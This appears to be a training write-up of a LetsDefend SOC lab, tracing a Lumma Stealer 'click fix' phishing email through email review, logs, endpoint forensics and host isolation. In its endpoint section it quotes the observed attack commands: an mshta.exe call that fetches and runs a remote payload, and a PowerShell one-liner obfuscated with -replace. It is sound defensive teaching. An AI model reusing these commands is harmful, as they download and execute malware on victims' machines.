<h1>🛡️Case Study: Lumma Stealer via DLL Side-Loading (Click Fix Phishing)</h1>
<h2>SOC338-Letsdefend.io</h2>

---

This repository showcases a detailed analysis and response to a Lumma Stealer phishing attack, delivered via a DLL side-loading technique. The case study is based on an alert from the LetsDefend.io platform (SOC338), where a user, Dylan, was targeted through a phishing email containing a link to a malicious website designed to distribute the Lumma Stealer malware.

In this project, I walk through the entire incident response process, from identifying and analyzing the malicious email, to reviewing logs, and finally containing the infected system. The project also includes detailed technical analysis, covering key tools such as VirusTotal, PowerShell logs, and network activity logs.

By following this case study, you will gain insights into the detection, investigation, and remediation of phishing-based malware attacks in a SOC environment. This project demonstrates core Blue Team skills including threat hunting, malware analysis, and incident response.

## 📌 Event Summary

| Field                  | Value                                                                 |
|------------------------|-----------------------------------------------------------------------|
| **Event ID**           | 316                                                                   |
| **Event Time**         | March 13, 2025, 09:44 AM                                              |
| **Rule Triggered**     | SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing     |
| **Analyst Level**      | Security Analyst                                                      |
| **Source Email**       | `update@windows-update.site`                                          |
| **Destination Email**  | `dylan@letsdefend.io`                                                 |
| **SMTP Address**       | `132.232.40.201`                                                      |
| **Subject Line**       | *Upgrade your system to Windows 11 Pro for FREE*                      |
| **Device Action**      | Allowed                                                               |
| **Trigger Reason**     | Redirected site contains a click-fix type script for Lumma Stealer    |

---

## 📨 Email Investigation

| Question                        | Answer                                                                                      |
|----------------------------------|----------------------------------------------------------------------------------------------|
| **When was it sent?**           | 📅 March 13, 2025, at 09:44 AM                                                               |
| **What is the SMTP address?**   | 🌐 `132.232.40.201`                                                                          |
| **What is the sender address?** | ✉️ `update@windows-update.site` (Spoofed domain mimicking Microsoft)                        |
| **What is the recipient?**      | 📥 `dylan@letsdefend.io`                                                                     |
| **Is the content suspicious?**  | ✅ Yes. High-value lure (free Windows upgrade), suspicious redirect, spoofed sender.         |
| **Are there attachments?**      | 📎 No direct attachment, but contains a malicious link that redirects to a file download.    |

---

## 🚨 Threat Description

This phishing email is a classic example of **social engineering** paired with **malware delivery**. Disguised as a Microsoft update offer, it tricks users into clicking a **"click fix" script** link. This link redirects the victim to a **malicious webpage**, which initiates the download of a file designed to execute **Lumma Stealer**—an info-stealing malware that harvests credentials, browser data, and crypto wallets.

The malware leverages **DLL side-loading**, a stealthy technique where a legitimate application is abused to execute a malicious DLL without triggering security alerts.

---


## 🛠️ Steps Taken

Email Containment 
Upon receiving the alert, we began our investigation by verifying the details of the email. The alert confirmed that the phishing email was sent to **Dylan** at the address `dylan@letsdefend.io`. The action status was **"Allowed,"** indicating that the email successfully reached the user's inbox.

<img src="https://i.imgur.com/AYjyV5t.png" height="80%" width="80%" alt="Destination address(Dylan) Action=Allowed"/>

---

I created a case and navigated to the **Email Security** section to view the content of the email received by Dylan. The email, with the subject *"Upgrade your system to Windows 11 Pro for FREE"*, contained several embedded URLs, one of which pointed to a suspicious domain: `https://windows-update.site`. To evaluate its threat level, we submitted the URL to **VirusTotal**, which flagged it as a **malicious/phishing website**.


<img src="https://i.imgur.com/trmbgKF.png" height="80%" width="80%" alt="Created Case"/>

---

<img src="https://i.imgur.com/vKIwXwn.png" height="80%" width="80%" alt="Email Security"/>

---

<img src="https://i.imgur.com/4AX5UsS.png" height="80%" width="80%" alt="E-mail Contents"/>

---

<img src="https://i.imgur.com/lEH0TFt.png" height="80%" width="80%" alt="Virus Total Results"/>

---

### 📤 Email Containment

Given the malicious nature of the email, it was promptly **removed from the user’s inbox** to prevent accidental engagement. 

<img src="https://i.imgur.com/Sd9eN5R.png" height="80%" width="80%" alt="Virus Total Results"/>

---

<img src="https://i.imgur.com/vG3U1N8.png" height="80%" width="80%" alt="Virus Total Results"/>

---

### 📚 Log Review

We then proceeded to the **Log Management** section to determine if the email had been accessed. By querying the system using the destination email address (`dylan@letsdefend.io`), we confirmed that **the malicious URL had indeed been clicked**, indicating potential execution of the payload.


<img src="https://i.imgur.com/2GpgwNb.png" height="80%" width="80%" alt="Virus Total Results"/>

---

<img src="https://i.imgur.com/Wz97269.png" height="80%" width="80%" alt="Virus Total Results"/>

---

<img src="https://i.imgur.com/EjRtQvn.png" height="80%" width="80%" alt="Virus Total Results"/>

---


### 🧠 Threat Intel/Attribution

The **SMTP IP address (132.232.40.201)** used in the phishing attempt was associated with known **Lumma Stealer C2 infrastructure**, supporting the initial rule trigger of **SOC338**.

---

<img src="https://i.imgur.com/5dWdN63.png" height="80%" width="80%" alt="Virus Total Results"/>

---

### 🖥️ Endpoint Analysis

In the **Endpoint Analysis** section, we identified suspicious PowerShell activity:
- On **March 13, 2025, at 23:26:31 and 23:26:32**, two PowerShell processes (IDs **7308** and **624**) executed the following command: [C:\Windows\system32\mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4]
- This indicates that mshta.exe was used to execute a malicious file from the suspicious domain overcoatpassably.shop. mshta.exe is a legitimate Microsoft tool often abused in attacks for executing HTA (HTML Application) files. The presence of the malicious link suggests that this was part of the malware's download and execution process.

---

<img src="https://i.imgur.com/UblEtIQ.png" height="80%" width="80%" alt="Virus Total Results"/>

---


<img src="https://i.imgur.com/0srryOU.png" height="80%" width="80%" alt="Virus Total Results"/>

---


<img src="https://i.imgur.com/W2DzoTg.png" height="80%" width="80%" alt="Virus Total Results"/>

---

Additionally, the Network Activity section revealed outbound traffic to an unfamiliar IP address: 132.232.40.201, further indicating that the system was contacting a Command and Control (C2) server.

---

<img src="https://i.imgur.com/AXeFlaz.png" height="80%" width="80%" alt="Virus Total Results"/>


In the Terminal History, we observed the following obfuscated PowerShell command:C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']')

This command uses an obfuscation technique where the -replace function is used to hide the true execution of mshta.exe, and includes a message:"I am not a robot - reCAPTCHA Verification ID: 3824"
This could be a distraction or decoy meant to confuse defenders or mimic legitimate browser activity.

<img src="https://i.imgur.com/vff1zBb.png" height="80%" width="80%" alt="Virus Total Results"/>

---

<img src="https://i.imgur.com/Uu0q449.png" height="80%" width="80%" alt="Virus Total Results"/>

---

<img src="https://i.imgur.com/bJqUqfm.png" height="80%" width="80%" alt="Virus Total Results"/>

---

Finally, the Browser History confirmed that the domain https://windows-update.site/ was accessed on March 13, 2025, at 23:26:08, corroborating the timing of the attack.

---

<img src="https://i.imgur.com/OtqLByR.png" height="80%" width="80%" alt="Virus Total Results"/>

### 🔐 Containment

Once the full scope of compromise was identified, we **isolated Dylan’s system** to prevent:

- Further malware execution  
- Data exfiltration or loss  
- Lateral movement  
- Unauthorized access or potential ransomware staging

The alert was then **closed**, and the full analysis was **documented** for future reference and threat intelligence enrichment.

---

<img src="https://i.imgur.com/RKrojoR.png" height="80%" width="80%" alt="Virus Total Results"/>

---

<img src="https://i.imgur.com/nEywZ8J.png" height="80%" width="80%" alt="Virus Total Results"/>

---

<h2>Summary</h2>

---

This case demonstrates the critical importance of early detection, proactive log analysis, and fast containment in response to phishing threats involving malware like Lumma Stealer. Techniques such as DLL side-loading and living-off-the-land binaries (LOLBins) like mshta.exe require SOC teams to stay vigilant and ready to act.

---
<h2>Key Skills Demonstrated</h2>


---

Phishing Investigation

Malware Analysis (DLL Side-Loading)

Threat Hunting

PowerShell & Network Forensics

Incident Response & Containment




